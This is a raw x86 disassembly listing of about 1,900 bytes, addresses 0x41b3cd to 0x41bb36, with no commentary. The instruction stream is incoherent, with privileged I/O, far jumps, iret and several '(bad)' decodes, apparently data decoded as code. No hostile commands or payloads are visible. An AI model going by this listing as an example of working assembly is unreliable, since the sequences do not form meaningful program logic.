  41b3cd:	ins    BYTE PTR es:[edi],dx
  41b3ce:	add    ebx,ecx
  41b3d0:	xor    eax,0xd8a58579
  41b3d5:	xchg   ebx,eax
  41b3d6:	adc    eax,0xf39df815
  41b3db:	int3   
  41b3dc:	sub    edx,DWORD PTR [edx+0x2c3e1fca]
  41b3e2:	fs adc ebx,ebp
  41b3e5:	sti    
  41b3e6:	iret   
  41b3e7:	mov    al,ds:0x82234bad
  41b3ec:	jbe    0x41b43b
  41b3ee:	sbb    eax,0x5d3294a7
  41b3f3:	inc    edi
  41b3f4:	jmp    0xeacd:0x59fe4a48
  41b3fb:	sbb    BYTE PTR [ebx-0x48],bl
  41b3fe:	cmp    al,0xfe
  41b400:	aad    0xb4
  41b402:	push   0xc52eb89d
  41b407:	in     eax,0xe4
  41b409:	pop    ecx
  41b40a:	inc    edi
  41b40b:	out    0xdd,al
  41b40d:	popa   
  41b40e:	repnz loope 0x41b44a
  41b411:	addr16 sbb al,0x38
  41b414:	ret    
  41b415:	fsubr  QWORD PTR [eax-0x47]
  41b418:	shl    DWORD PTR [edx],0xfd
  41b41b:	in     al,0x86
  41b41d:	cmp    bh,BYTE PTR [edi+0x6e]
  41b420:	pop    edi
  41b421:	mov    esi,edi
  41b423:	push   cs
  41b424:	xor    DWORD PTR [edi+0x6bd2e],esp
  41b42a:	pop    ds
  41b42b:	xchg   edi,eax
  41b42c:	arpl   bp,bp
  41b42e:	stos   BYTE PTR es:[edi],al
  41b42f:	pop    esi
  41b430:	fisub  WORD PTR [ecx+ebp*4]
  41b433:	jle    0x41b42f
  41b435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b436:	in     eax,dx
  41b437:	inc    edi
  41b438:	and    DWORD PTR [ecx-0x2b],esi
  41b43b:	mov    ?,WORD PTR [edi-0x33]
  41b43e:	gs in  al,0x60
  41b441:	and    eax,0x2dbf457d
  41b446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b447:	cdq    
  41b448:	or     ah,BYTE PTR [esi-0x2ba9afde]
  41b44e:	mov    esp,0x26608e9a
  41b453:	mov    esp,0x8a2cb8ec
  41b458:	inc    esp
  41b459:	call   0xab33:0x4930267f
  41b460:	xchg   DWORD PTR fs:[ebx+0x40c3bdc0],eax
  41b467:	sbb    eax,0xb3fcf29b
  41b46c:	imul   BYTE PTR [ebp-0x4d3a3ae8]
  41b472:	stc    
  41b473:	test   al,0x81
  41b475:	in     eax,0x53
  41b477:	pop    ebx
  41b478:	ins    BYTE PTR es:[edi],dx
  41b479:	sub    edi,esp
  41b47b:	fxtract 
  41b47d:	or     DWORD PTR [eax],esp
  41b47f:	mov    ch,0x90
  41b481:	mov    ch,0xe5
  41b483:	add    al,0xe5
  41b485:	push   edx
  41b486:	and    dl,BYTE PTR [ebx+0x6f]
  41b489:	dec    esi
  41b48a:	mov    ecx,0xe4dbfe19
  41b48f:	mov    ds:0x9351e573,al
  41b494:	retf   
  41b495:	ins    BYTE PTR es:[edi],dx
  41b496:	outs   dx,BYTE PTR ds:[esi]
  41b497:	aam    0xca
  41b499:	in     al,dx
  41b49a:	shr    DWORD PTR [esi],cl
  41b49c:	dec    esi
  41b49d:	shl    al,0x8e
  41b4a0:	sbb    eax,0x2c00d752
  41b4a5:	rol    BYTE PTR ds:[edi-0x1645d8d2],1
  41b4ac:	je     0x41b4ea
  41b4ae:	fistp  WORD PTR ds:0xc43c58c4
  41b4b4:	add    BYTE PTR [edi+0x4555a16],dl
  41b4ba:	fbld   TBYTE PTR [edx]
  41b4bc:	dec    edi
  41b4bd:	cmp    al,0x1
  41b4bf:	xchg   edi,eax
  41b4c0:	jmp    0xa342:0x120731e1
  41b4c7:	aad    0x3c
  41b4c9:	xchg   esp,edx
  41b4cb:	mov    al,ds:0xae9f32b1
  41b4d0:	pop    eax
  41b4d1:	sub    eax,0xc62858d2
  41b4d6:	and    ch,BYTE PTR [esi-0x7f4ee4e8]
  41b4dc:	mov    edi,DWORD PTR [esi+0x5f]
  41b4df:	bound  ecx,QWORD PTR [ebx]
  41b4e1:	je     0x41b4aa
  41b4e3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b4e5:	xchg   ebx,eax
  41b4e6:	cmp    ecx,esi
  41b4e8:	sub    eax,0x94abb116
  41b4ed:	imul   esp,DWORD PTR [ebx+0x3a779ee3],0xffffff87
  41b4f4:	cli    
  41b4f5:	cld    
  41b4f6:	sub    cl,BYTE PTR [esi-0xa2b406d]
  41b4fc:	mov    ebx,0xf82824b5
  41b501:	popf   
  41b502:	push   esi
  41b503:	sub    ch,ah
  41b505:	addr16 iret 
  41b507:	cli    
  41b508:	xor    ebp,DWORD PTR [eax-0x3b7df78e]
  41b50e:	into   
  41b50f:	call   0xf30a49d
  41b514:	enter  0x54ad,0xd9
  41b518:	cmp    DWORD PTR [edi+0x41e413c0],eax
  41b51e:	in     al,0x1b
  41b520:	fwait
  41b521:	and    eax,0xd89963a
  41b526:	in     al,dx
  41b527:	mov    ebp,0x31781dd7
  41b52c:	sbb    dh,al
  41b52e:	into   
  41b52f:	mov    al,0xd0
  41b531:	stos   DWORD PTR es:[edi],eax
  41b532:	mov    esi,0x5d71595e
  41b537:	sbb    BYTE PTR [edx-0x28],al
  41b53a:	stos   BYTE PTR es:[edi],al
  41b53b:	push   eax
  41b53c:	mov    eax,ds:0x3b526e8a
  41b541:	push   esi
  41b542:	in     eax,0xac
  41b544:	and    eax,0x805bc738
  41b549:	push   cs
  41b54a:	lea    ebp,[ecx-0x52]
  41b54d:	jns    0x41b4f1
  41b54f:	sbb    DWORD PTR [ecx],ebx
  41b551:	cli    
  41b552:	jle    0x41b51a
  41b554:	and    DWORD PTR [ecx-0x17],0xffffff87
  41b558:	jb     0x41b5a3
  41b55a:	int    0x56
  41b55c:	aad    0x25
  41b55e:	dec    edi
  41b55f:	fmul   QWORD PTR [edx-0x2a]
  41b562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b563:	mov    edi,DWORD PTR [ebp+0x69]
  41b566:	and    ch,BYTE PTR [ebp+0x68bf5f52]
  41b56c:	sub    ebp,DWORD PTR gs:[edi]
  41b56f:	sub    eax,0x76588066
  41b574:	popf   
  41b575:	imul   edx,DWORD PTR [edi],0x4a6ffbf2
  41b57b:	stos   BYTE PTR es:[edi],al
  41b57c:	loopne 0x41b554
  41b57e:	dec    esi
  41b57f:	mov    eax,ds:0x6eca2c8e
  41b584:	adc    dh,BYTE PTR [edi-0x3f]
  41b587:	js     0x41b525
  41b589:	sbb    eax,0x6b18b1c0
  41b58e:	inc    ebp
  41b58f:	pop    eax
  41b590:	push   ds
  41b591:	les    edi,FWORD PTR [ecx]
  41b593:	adc    DWORD PTR [edi],edi
  41b595:	out    0x5c,eax
  41b597:	pop    edi
  41b598:	loopne 0x41b583
  41b59a:	cli    
  41b59b:	pushf  
  41b59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b59d:	in     eax,dx
  41b59e:	rol    BYTE PTR [edi+edi*1-0xa],0xaa
  41b5a3:	icebp  
  41b5a4:	jno    0x41b57b
  41b5a6:	aad    0x31
  41b5a8:	dec    ebx
  41b5a9:	out    0x89,eax
  41b5ab:	and    ebx,DWORD PTR [ecx+0x18fd165f]
  41b5b1:	enter  0xd381,0xd0
  41b5b5:	lahf   
  41b5b6:	in     eax,dx
  41b5b7:	or     edi,DWORD PTR cs:[ecx+0x16]
  41b5bb:	js     0x41b56d
  41b5bd:	lahf   
  41b5be:	int3   
  41b5bf:	loop   0x41b563
  41b5c1:	fisttp WORD PTR [ebp+ecx*8+0x38a5a9ba]
  41b5c8:	popf   
  41b5c9:	je     0x41b633
  41b5cb:	mov    ebp,0x99fdd69e
  41b5d0:	adc    ebx,eax
  41b5d2:	ja     0x41b586
  41b5d4:	fdivr  QWORD PTR [ebp+0x4a1a621]
  41b5da:	jl     0x41b5a2
  41b5dc:	adc    cl,BYTE PTR [edx+0x51]
  41b5df:	mov    ebx,0x330d273a
  41b5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5e5:	sbb    eax,DWORD PTR [ebx-0x67]
  41b5e8:	aaa    
  41b5e9:	jle    0x41b5ac
  41b5eb:	cmp    dl,0x75
  41b5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ef:	les    edi,FWORD PTR [ecx]
  41b5f1:	jnp    0x41b578
  41b5f3:	mov    al,ds:0xf750fe88
  41b5f8:	shr    BYTE PTR [ebx+0x7e],0xe
  41b5fc:	xor    al,BYTE PTR [edx]
  41b5fe:	xchg   ecx,eax
  41b5ff:	popf   
  41b600:	in     eax,dx
  41b601:	or     al,0xf
  41b603:	push   ebp
  41b604:	jp     0x41b5bb
  41b606:	ja     0x41b638
  41b608:	xchg   edi,eax
  41b609:	sbb    dh,dh
  41b60b:	dec    edx
  41b60c:	(bad)  
  41b60d:	mov    ch,0x3b
  41b60f:	add    BYTE PTR [ecx-0x2a],0x33
  41b613:	daa    
  41b614:	mov    ch,0xa5
  41b616:	lds    eax,FWORD PTR [ebp-0x55]
  41b619:	iret   
  41b61a:	icebp  
  41b61b:	test   BYTE PTR [edi],ch
  41b61d:	sbb    ebx,DWORD PTR [ebx+esi*4+0xceeaac6]
  41b624:	les    ebp,FWORD PTR ds:0xacb624c3
  41b62a:	in     eax,dx
  41b62b:	stos   DWORD PTR es:[edi],eax
  41b62c:	imul   esi,DWORD PTR [eax+0x14],0x309f4671
  41b633:	pop    esp
  41b634:	popf   
  41b635:	(bad)  
  41b637:	jle    0x41b5ec
  41b639:	or     bh,ah
  41b63b:	jge    0x41b638
  41b63d:	cld    
  41b63e:	adc    ch,BYTE PTR [esp+eax*1-0x73]
  41b642:	lock mov ah,0x9b
  41b645:	lods   eax,DWORD PTR ds:[esi]
  41b646:	cs ja  0x41b6ad
  41b649:	and    BYTE PTR [ecx+0x72],0x77
  41b64d:	xor    eax,0x5e6f22ed
  41b652:	or     DWORD PTR [ebp+0x67],0x6d
  41b656:	pop    ss
  41b657:	jmp    0x9f1e:0xaaf5b21d
  41b65e:	addr16 into 
  41b660:	cs push 0x3d
  41b663:	and    cl,ah
  41b665:	fild   QWORD PTR [edx+ebp*2-0x7]
  41b669:	xchg   DWORD PTR [edi],edi
  41b66b:	leave  
  41b66c:	cmp    ecx,DWORD PTR [esi-0x795d079a]
  41b672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b673:	div    dl
  41b675:	into   
  41b676:	outs   dx,DWORD PTR ds:[esi]
  41b677:	ret    0x4c87
  41b67a:	idiv   esp
  41b67c:	fisub  DWORD PTR [ebx]
  41b67e:	jp     0x41b676
  41b680:	mov    bl,0xca
  41b682:	std    
  41b683:	xchg   BYTE PTR [edx+0x16],ch
  41b686:	cmp    bh,ch
  41b688:	xchg   BYTE PTR [ebx-0x3d],cl
  41b68b:	mov    WORD PTR [ebx+0x8b09ea8],?
  41b691:	mov    ss,edi
  41b693:	in     al,dx
  41b694:	push   es
  41b695:	iret   
  41b696:	les    eax,FWORD PTR [ebx-0x264e2f78]
  41b69c:	and    al,0x4
  41b69e:	fnstenv [ebx+eax*2+0x2b]
  41b6a2:	jg     0x41b6ab
  41b6a4:	dec    edx
  41b6a5:	cmp    al,0x81
  41b6a7:	xor    dl,BYTE PTR ds:[eax]
  41b6aa:	div    cl
  41b6ac:	scas   al,BYTE PTR es:[edi]
  41b6ad:	nop
  41b6ae:	adc    BYTE PTR [eax-0x60],ch
  41b6b1:	out    0x52,eax
  41b6b3:	clc    
  41b6b4:	inc    esi
  41b6b5:	mov    cl,0x1
  41b6b7:	adc    bl,BYTE PTR [ebx]
  41b6b9:	adc    DWORD PTR [ecx-0x5ec1e41f],ebp
  41b6bf:	std    
  41b6c0:	test   BYTE PTR [eax],bh
  41b6c2:	ret    
  41b6c3:	pop    eax
  41b6c4:	out    0x9d,al
  41b6c6:	adc    BYTE PTR [edx],al
  41b6c8:	cmp    ebx,0xffffffdb
  41b6cb:	pop    ds
  41b6cc:	xchg   ebx,eax
  41b6cd:	or     ah,0xd0
  41b6d0:	es fwait
  41b6d2:	pop    ebx
  41b6d3:	pop    edx
  41b6d4:	fmul   QWORD PTR [edi+ecx*2-0x1806f545]
  41b6db:	pop    eax
  41b6dc:	push   0x47
  41b6de:	cmovl  ebx,DWORD PTR [esi+0x52]
  41b6e2:	icebp  
  41b6e3:	or     al,0x15
  41b6e5:	fidiv  DWORD PTR [edi-0x64]
  41b6e8:	sbb    al,0xc3
  41b6ea:	jnp    0x41b6c9
  41b6ec:	inc    ebp
  41b6ed:	jle    0x41b766
  41b6ef:	sub    DWORD PTR [ebx-0x2709ce87],esi
  41b6f5:	or     al,0x68
  41b6f7:	xchg   ecx,eax
  41b6f8:	cdq    
  41b6f9:	iret   
  41b6fa:	xchg   ebp,eax
  41b6fb:	aam    0x51
  41b6fd:	push   0x7
  41b6ff:	add    al,0xe8
  41b701:	fs adc al,0x92
  41b704:	addr16 adc dl,0x14
  41b708:	pusha  
  41b709:	(bad)  
  41b70a:	cmc    
  41b70b:	inc    edi
  41b70c:	xchg   edi,eax
  41b70d:	cs pusha 
  41b70f:	xchg   ebp,eax
  41b710:	(bad)  
  41b712:	jb     0x41b716
  41b714:	lea    ebx,[edi+0x68c508b1]
  41b71a:	lea    ebx,[edi-0x4f]
  41b71d:	and    bh,BYTE PTR [eax+ebp*4-0x64fc8afb]
  41b724:	pop    ss
  41b725:	xchg   ebp,eax
  41b726:	jns    0x41b750
  41b728:	std    
  41b729:	cdq    
  41b72a:	or     eax,0xed0f0b7d
  41b72f:	dec    edi
  41b730:	push   ss
  41b731:	outs   dx,DWORD PTR ds:[esi]
  41b732:	je     0x41b75f
  41b734:	pop    esi
  41b735:	add    al,0xef
  41b737:	xchg   ebx,eax
  41b738:	or     DWORD PTR [edi-0x10],esp
  41b73b:	adc    al,0xf8
  41b73d:	xlat   BYTE PTR ds:[ebx]
  41b73e:	jb     0x41b783
  41b740:	pop    eax
  41b741:	dec    eax
  41b742:	mov    eax,0x52fd82b6
  41b747:	dec    ecx
  41b748:	add    dl,BYTE PTR [edi]
  41b74a:	(bad)  
  41b74b:	xchg   ebx,eax
  41b74c:	(bad)  [ebp-0x1c]
  41b74f:	(bad)  
  41b750:	push   0x82433a33
  41b755:	mov    ds:0x2e65d035,eax
  41b75a:	stos   BYTE PTR es:[edi],al
  41b75b:	cli    
  41b75c:	adc    eax,eax
  41b75e:	loop   0x41b7ac
  41b760:	loope  0x41b7dd
  41b762:	cld    
  41b763:	bound  eax,QWORD PTR [esi+eiz*2-0x3b]
  41b767:	aaa    
  41b768:	in     al,dx
  41b769:	sbb    ch,BYTE PTR [edi]
  41b76b:	cmp    ecx,DWORD PTR [edi]
  41b76d:	cmp    al,0xd3
  41b76f:	xchg   esi,eax
  41b770:	fisubr DWORD PTR ds:0x74fdaef5
  41b776:	xor    edi,DWORD PTR [esi]
  41b778:	ror    DWORD PTR [edx-0x35],cl
  41b77b:	mov    edi,0xd91b28b3
  41b780:	inc    esi
  41b781:	leave  
  41b782:	std    
  41b783:	cmp    ebp,DWORD PTR [esi-0x57]
  41b786:	aad    0x9f
  41b788:	xor    eax,0xb3c783bf
  41b78d:	inc    ecx
  41b78e:	enter  0xa697,0x6e
  41b792:	inc    eax
  41b793:	(bad)  
  41b794:	sbb    BYTE PTR [ecx-0xd],bl
  41b797:	mov    al,ds:0x8e108013
  41b79c:	repz loope 0x41b755
  41b79f:	fld    QWORD PTR [ecx+0x68]
  41b7a2:	push   ebx
  41b7a3:	sub    al,0x4b
  41b7a5:	adc    bl,BYTE PTR [ebp+0x68f7fcb2]
  41b7ab:	and    DWORD PTR [esi],ebx
  41b7ad:	in     al,dx
  41b7ae:	push   0x45f7d587
  41b7b3:	iret   
  41b7b4:	int3   
  41b7b5:	(bad)  
  41b7b6:	clc    
  41b7b7:	push   ebx
  41b7b8:	outs   dx,DWORD PTR ds:[esi]
  41b7b9:	lds    edx,FWORD PTR [esi+0x5a]
  41b7bc:	add    al,0x99
  41b7be:	sub    BYTE PTR [ebx+0x1],ah
  41b7c1:	addr16 pop edx
  41b7c3:	jmp    0x4762:0xb188f933
  41b7ca:	aad    0x69
  41b7cc:	mov    edi,0x68acc89d
  41b7d1:	add    edx,ebp
  41b7d3:	mov    bh,BYTE PTR [edx]
  41b7d5:	retf   0x8ef5
  41b7d8:	sti    
  41b7d9:	out    dx,eax
  41b7da:	fcomp  DWORD PTR [eax-0x38]
  41b7dd:	cwde   
  41b7de:	lods   eax,DWORD PTR ds:[esi]
  41b7df:	into   
  41b7e0:	sbb    DWORD PTR [bp-0x1499],ecx
  41b7e5:	mov    bh,0x28
  41b7e7:	call   0xab9bcece
  41b7ec:	repnz add esi,DWORD PTR es:[edi-0x7b]
  41b7f1:	in     eax,0xe6
  41b7f3:	mov    ch,BYTE PTR [ecx+0x2420b828]
  41b7f9:	and    DWORD PTR [edx-0x64],0x17
  41b7fd:	xchg   ecx,eax
  41b7fe:	mov    ds:0x9acc637d,al
  41b803:	xchg   ebp,eax
  41b804:	xchg   esp,eax
  41b805:	(bad)  
  41b806:	or     dl,dl
  41b808:	and    eax,0x4df342bd
  41b80d:	dec    ebp
  41b80e:	jo     0x41b86d
  41b810:	int3   
  41b811:	lods   al,BYTE PTR ds:[esi]
  41b812:	dec    edx
  41b813:	cmc    
  41b814:	and    eax,0xd77752a0
  41b819:	mov    ds:0xd5cbc54,al
  41b81e:	lds    edx,FWORD PTR [eax]
  41b820:	imul   ebp,esi,0xf03365d7
  41b826:	push   es
  41b827:	(bad)  
  41b828:	lods   eax,DWORD PTR ds:[esi]
  41b829:	or     DWORD PTR [esi+0x15],edi
  41b82c:	mul    DWORD PTR [esi+ecx*1]
  41b82f:	and    eax,0x8c2c5c6b
  41b834:	lock sub BYTE PTR [edx-0x41],dl
  41b838:	(bad)  
  41b839:	loopne 0x41b8ad
  41b83b:	mov    esp,0x7c7fd112
  41b840:	jo     0x41b839
  41b842:	int    0x58
  41b844:	and    edx,DWORD PTR [eax-0x7e42de37]
  41b84a:	jns    0x41b7d8
  41b84c:	sub    eax,0x7fc3f191
  41b851:	rcl    DWORD PTR cs:[ebx+0x6c12a661],1
  41b858:	imul   ecx,DWORD PTR [edx-0x10],0x10e28f72
  41b85f:	sbb    dl,cl
  41b861:	adc    eax,0xfea22afc
  41b866:	pop    edx
  41b867:	call   FWORD PTR [ecx+ecx*1+0x882e486]
  41b86e:	out    0xa6,eax
  41b870:	or     ebp,DWORD PTR [ebp-0x1a04c035]
  41b876:	leave  
  41b877:	repnz dec edi
  41b879:	push   ds
  41b87a:	sahf   
  41b87b:	mov    esp,0xc01a7e05
  41b880:	retf   
  41b881:	hlt    
  41b882:	xchg   BYTE PTR [ecx-0xc],bh
  41b885:	popf   
  41b886:	shl    edi,0xdb
  41b889:	xor    al,bl
  41b88b:	mov    dl,0x33
  41b88d:	jmp    0x9a25:0x73790f5e
  41b894:	jle    0x41b86c
  41b896:	ja     0x41b897
  41b898:	mov    eax,0x283a2ab3
  41b89d:	jno    0x41b913
  41b89f:	ss hlt 
  41b8a1:	mov    edx,0xde9de5cf
  41b8a6:	mov    edi,0xa70c1cfe
  41b8ab:	jns    0x41b92b
  41b8ad:	xchg   edi,eax
  41b8ae:	mov    ebx,0x1a75638c
  41b8b3:	mov    eax,0xdbc85043
  41b8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8b9:	mov    BYTE PTR [edi-0x35],ah
  41b8bc:	test   eax,0x1ff14c18
  41b8c1:	mov    esi,0x4f70903d
  41b8c6:	imul   edx,DWORD PTR [ebp-0x2d],0xcf2dd2f5
  41b8cd:	int3   
  41b8ce:	xchg   DWORD PTR [ebx],ecx
  41b8d0:	inc    edi
  41b8d1:	adc    cl,BYTE PTR [edx-0x53c39056]
  41b8d7:	xchg   esp,eax
  41b8d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8d9:	inc    edx
  41b8da:	lea    eax,[ecx-0x3629ab95]
  41b8e0:	imul   esp,DWORD PTR [eax-0x64],0xf44fb3ec
  41b8e7:	mov    ds:0xb2dca1a2,al
  41b8ec:	sbb    eax,esp
  41b8ee:	mov    edi,0xbef01971
  41b8f3:	mov    al,0xbe
  41b8f5:	(bad)  
  41b8f6:	jl     0x41b8ce
  41b8f8:	iret   
  41b8f9:	push   esp
  41b8fa:	lds    ecx,FWORD PTR [esi-0x40]
  41b8fd:	fidivr WORD PTR [edi+edi*1]
  41b900:	pusha  
  41b901:	jge    0x41b907
  41b903:	je     0x41b97c
  41b905:	lds    edi,FWORD PTR [edx-0x797fb92b]
  41b90b:	cli    
  41b90c:	sbb    BYTE PTR [edi+0xa],al
  41b90f:	pop    edx
  41b910:	sahf   
  41b911:	inc    ecx
  41b912:	cld    
  41b913:	outs   dx,BYTE PTR ds:[esi]
  41b914:	xchg   edx,eax
  41b915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b916:	ja     0x41b914
  41b918:	stos   BYTE PTR es:[edi],al
  41b919:	add    al,0xe6
  41b91b:	and    eax,0x39f2af25
  41b920:	adc    BYTE PTR [edx],al
  41b922:	outs   dx,DWORD PTR ds:[esi]
  41b923:	xchg   ebx,ebp
  41b925:	xchg   ebx,eax
  41b926:	inc    ecx
  41b927:	adc    al,0x57
  41b929:	out    dx,eax
  41b92a:	ds lahf 
  41b92c:	xlat   BYTE PTR ds:[ebx]
  41b92d:	and    eax,0xb5c9382f
  41b932:	cs scas al,BYTE PTR es:[edi]
  41b934:	xor    DWORD PTR [ecx+0x4aad903f],esi
  41b93a:	fs mov esp,0xbb6a718d
  41b940:	cli    
  41b941:	and    al,0xab
  41b943:	cmp    eax,0x47fe7704
  41b948:	inc    esi
  41b949:	push   0xffffffa4
  41b94b:	icebp  
  41b94c:	outs   dx,DWORD PTR ds:[esi]
  41b94d:	cmp    edi,DWORD PTR [eax-0x17ca2f77]
  41b953:	ins    DWORD PTR es:[edi],dx
  41b954:	push   eax
  41b955:	xor    DWORD PTR [ecx+0x6adfe28e],esi
  41b95b:	pop    ds
  41b95c:	cmp    BYTE PTR [esi-0x2ffb5cb1],ah
  41b962:	push   es
  41b963:	sbb    eax,0x4de8ddde
  41b968:	scas   al,BYTE PTR es:[edi]
  41b969:	je     0x41b8f8
  41b96b:	or     esp,esp
  41b96d:	mov    edx,esp
  41b96f:	lds    esi,FWORD PTR [esi-0x6d]
  41b972:	(bad)  
  41b973:	js     0x41b9ea
  41b975:	pop    es
  41b976:	sbb    dl,BYTE PTR [esi-0x54c2ea7f]
  41b97c:	sti    
  41b97d:	cmp    ah,bh
  41b97f:	inc    esp
  41b980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b981:	fisub  WORD PTR [eax]
  41b983:	or     BYTE PTR [ebp-0x57],dl
  41b986:	xor    ecx,esi
  41b988:	mov    esp,0x7c7a8f43
  41b98d:	and    dh,dl
  41b98f:	rol    BYTE PTR [ecx-0x209cc07d],1
  41b995:	pusha  
  41b996:	fwait
  41b997:	push   esi
  41b998:	sbb    eax,0x2184ca6f
  41b99d:	inc    edx
  41b99e:	nop
  41b99f:	les    ebx,FWORD PTR [eax]
  41b9a1:	jmp    0x9934965a
  41b9a6:	cmp    DWORD PTR [esi+0x2dab7caa],esp
  41b9ac:	sub    DWORD PTR [edx+0x359c11b7],edi
  41b9b2:	fnsave [esi]
  41b9b4:	lds    ecx,FWORD PTR [edi+0x59]
  41b9b7:	rol    DWORD PTR [ecx],0xb0
  41b9ba:	outs   dx,BYTE PTR ds:[esi]
  41b9bb:	xor    BYTE PTR [eax],ah
  41b9bd:	inc    ebx
  41b9be:	popa   
  41b9bf:	mov    edi,0x67bfd0a9
  41b9c4:	test   ebx,esp
  41b9c6:	jmp    0x8e1c:0xac3c0fcf
  41b9cd:	jb     0x41ba09
  41b9cf:	inc    edi
  41b9d0:	and    BYTE PTR [ecx+edx*4-0x5c],bh
  41b9d4:	dec    edx
  41b9d5:	sbb    al,0xea
  41b9d7:	in     al,0x63
  41b9d9:	add    BYTE PTR [ecx],bh
  41b9db:	add    DWORD PTR [esi],ecx
  41b9dd:	out    dx,eax
  41b9de:	sbb    DWORD PTR [ebx-0x7199cb1a],ecx
  41b9e4:	jge    0x41ba52
  41b9e6:	or     ebx,DWORD PTR [edi+0x66d649e1]
  41b9ec:	mov    dl,0x96
  41b9ee:	arpl   WORD PTR [eax+eiz*2],dx
  41b9f1:	jecxz  0x41b9c1
  41b9f3:	pop    esi
  41b9f4:	add    bl,ah
  41b9f6:	adc    bh,BYTE PTR [esi+0x3644e461]
  41b9fc:	inc    edx
  41b9fd:	stc    
  41b9fe:	fstp   DWORD PTR [esi+0x2a]
  41ba01:	mov    bh,0xe8
  41ba03:	sbb    DWORD PTR [eax-0x13abf943],ecx
  41ba09:	nop
  41ba0a:	addr16 clc 
  41ba0c:	xchg   edi,eax
  41ba0d:	xchg   DWORD PTR [esp+edx*2-0x3c],edi
  41ba11:	and    bh,0xe8
  41ba14:	and    dh,BYTE PTR [edi-0x3e]
  41ba17:	pop    esi
  41ba18:	test   al,0x4b
  41ba1a:	fstp   st(1)
  41ba1c:	mov    eax,0xfc7c2b09
  41ba21:	add    eax,0x741c3396
  41ba26:	jecxz  0x41ba5d
  41ba28:	inc    esi
  41ba29:	shl    DWORD PTR ds:0xd134cd8f,cl
  41ba2f:	cwde   
  41ba30:	sub    BYTE PTR [esp+edx*8-0x18411ad8],ch
  41ba37:	test   al,0x48
  41ba39:	fld    DWORD PTR [ebp-0x26]
  41ba3c:	in     al,0xf4
  41ba3e:	fidivr WORD PTR [ebp+0x75]
  41ba41:	(bad)  
  41ba42:	and    edx,esi
  41ba44:	and    esi,DWORD PTR [ebp-0x6c7f794c]
  41ba4a:	imul   eax,eax,0x7857ffa
  41ba50:	sub    dh,cl
  41ba52:	xchg   esp,eax
  41ba53:	into   
  41ba54:	je     0x41ba48
  41ba56:	adc    BYTE PTR [edi+0x3b],cl
  41ba59:	inc    ecx
  41ba5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba5b:	xor    DWORD PTR [edi+0x3a05cd5c],esi
  41ba61:	out    dx,al
  41ba62:	xor    edi,esi
  41ba64:	jo     0x41babb
  41ba66:	adc    esp,DWORD PTR [ecx]
  41ba68:	push   ebx
  41ba69:	fst    QWORD PTR [edi+eax*1]
  41ba6c:	rcr    DWORD PTR [ebp-0x54c11637],cl
  41ba72:	call   0x8bad:0x13dcac2f
  41ba79:	(bad)  
  41ba7a:	loopne 0x41bafb
  41ba7c:	push   esp
  41ba7d:	sbb    cl,ch
  41ba7f:	sub    DWORD PTR [eax+0x2f],esi
  41ba82:	jo     0x41baa7
  41ba84:	adc    BYTE PTR [ebx+esi*1-0x65],ch
  41ba88:	js     0x41ba28
  41ba8a:	scas   al,BYTE PTR es:[edi]
  41ba8b:	rcr    BYTE PTR [eax],1
  41ba8d:	ret    0x1aa
  41ba90:	cmp    DWORD PTR [edx+0x2a],esi
  41ba93:	sti    
  41ba94:	call   0x5e3f:0x15cf24bf
  41ba9b:	and    al,0xc3
  41ba9d:	lods   al,BYTE PTR ds:[esi]
  41ba9e:	clc    
  41ba9f:	pop    edi
  41baa0:	(bad)  
  41baa1:	xlat   BYTE PTR ds:[ebx]
  41baa2:	xchg   ebx,eax
  41baa3:	jne    0x41ba8d
  41baa5:	test   WORD PTR [ebx+0x3d],0xe6ba
  41baab:	mov    ch,0x4c
  41baad:	xlat   BYTE PTR ds:[ebx]
  41baae:	call   0x34e5b56e
  41bab3:	not    BYTE PTR [edx]
  41bab5:	es mov esi,edi
  41bab8:	out    dx,al
  41bab9:	jnp    0x41bb24
  41babb:	xchg   ebx,eax
  41babc:	xchg   edi,eax
  41babd:	xchg   ebx,eax
  41babe:	xchg   edx,eax
  41babf:	pusha  
  41bac0:	arpl   WORD PTR [ebp+0x6fa9e27b],di
  41bac6:	jp     0x41badd
  41bac8:	add    al,0x81
  41baca:	jecxz  0x41bae8
  41bacc:	stos   DWORD PTR es:[edi],eax
  41bacd:	out    dx,eax
  41bace:	cmp    esi,DWORD PTR [edi+0x3e7af054]
  41bad4:	xor    eax,0x103e1e5e
  41bad9:	inc    edi
  41bada:	adc    al,0xc3
  41badc:	imul   eax
  41bade:	cmp    BYTE PTR [eax],ch
  41bae0:	aam    0xc3
  41bae2:	pushf  
  41bae3:	adc    bh,bh
  41bae5:	outs   dx,BYTE PTR ds:[esi]
  41bae6:	(bad)  
  41bae7:	hlt    
  41bae8:	mov    esp,0xef6d7d40
  41baed:	mov    dl,0x9a
  41baef:	push   eax
  41baf0:	rcl    BYTE PTR ds:0x3d077eb5,0x21
  41baf7:	sub    BYTE PTR [ebx],0x24
  41bafa:	xor    bh,BYTE PTR [edi-0x15]
  41bafd:	pop    eax
  41bafe:	pop    esp
  41baff:	into   
  41bb00:	pop    esp
  41bb01:	hlt    
  41bb02:	nop
  41bb03:	repnz scas eax,DWORD PTR es:[edi]
  41bb05:	mov    bl,0x8e
  41bb07:	pop    es
  41bb08:	mov    eax,0x5032eb4
  41bb0d:	addr16 lock push es
  41bb10:	sub    eax,0x7a84c58a
  41bb15:	aad    0x88
  41bb17:	or     al,0x3b
  41bb19:	loope  0x41bb5d
  41bb1b:	mov    WORD PTR [ebx],gs
  41bb1d:	mov    ds:0x1cf3baf,al
  41bb22:	test   eax,0x2bbed08b
  41bb27:	sbb    eax,DWORD PTR [ebx+0x3b32f292]
  41bb2d:	imul   ebx,DWORD PTR [ecx-0x6],0x1a
  41bb31:	mov    esp,0x9bdc397
  41bb36:	ins    DWORD PTR es:[edi],dx
